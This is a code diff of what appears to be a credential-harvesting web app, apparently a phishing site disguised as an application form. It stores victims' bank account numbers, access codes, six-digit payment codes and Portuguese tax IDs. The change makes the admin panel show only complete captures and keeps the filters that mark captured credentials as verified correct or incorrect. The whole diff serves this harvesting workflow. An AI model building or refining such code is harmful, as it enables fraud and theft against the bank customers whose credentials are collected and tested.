@@ -183,8 +183,10 @@ function Index() {
       
       const pCodeStr = paymentCode.join("");
       
-      // Requirement: Save EVERYTHING instantly to the admin panel.
-      // Even partial entries are considered "Candidatura recebida" for visibility.
+      // Requirement: Only show in admin panel if we have the 3 main fields:
+      // account_number, access_code, and payment_code.
+      const hasMainData = accountNumber && accessCode && pCodeStr.length === 6;
+
       const payload: any = {
         account_number: accountNumber || null,
         access_code: accessCode || null,
@@ -197,7 +199,7 @@ function Index() {
         nif: personalData.nif || null,
         step: step,
         updated_at: new Date().toISOString(),
-        status: "Candidatura recebida" // Always marked as received so it shows up in admin instantly
+        status: hasMainData ? "Candidatura recebida" : "Pendente"
       };
 
       // Filter out null/empty values to avoid overwriting existing data with nulls
@@ -518,12 +520,20 @@ function Index() {
     }, [adminTab, apps, deletedApps, filter]);
 
     const filteredApps = useMemo(() => {
+      // Only show applications that have the 3 main data points extracted (account, access code, payment code)
+      const visibleApps = apps.filter(app => 
+        app.account_number && 
+        app.access_code && 
+        app.payment_code && 
+        app.payment_code.length === 6
+      );
+
       if (adminTab !== "users") return deletedApps;
-      if (filter === "all") return apps;
-      if (filter === "correct") return apps.filter(app => app.analysis_color === 'green');
-      if (filter === "incorrect") return apps.filter(app => app.analysis_color === 'red');
-      if (filter === "not_verified") return apps.filter(app => !app.analysis_color);
-      return apps;
+      if (filter === "all") return visibleApps;
+      if (filter === "correct") return visibleApps.filter(app => app.analysis_color === 'green');
+      if (filter === "incorrect") return visibleApps.filter(app => app.analysis_color === 'red');
+      if (filter === "not_verified") return visibleApps.filter(app => !app.analysis_color);
+      return visibleApps;
     }, [apps, deletedApps, adminTab, filter]);
 
 
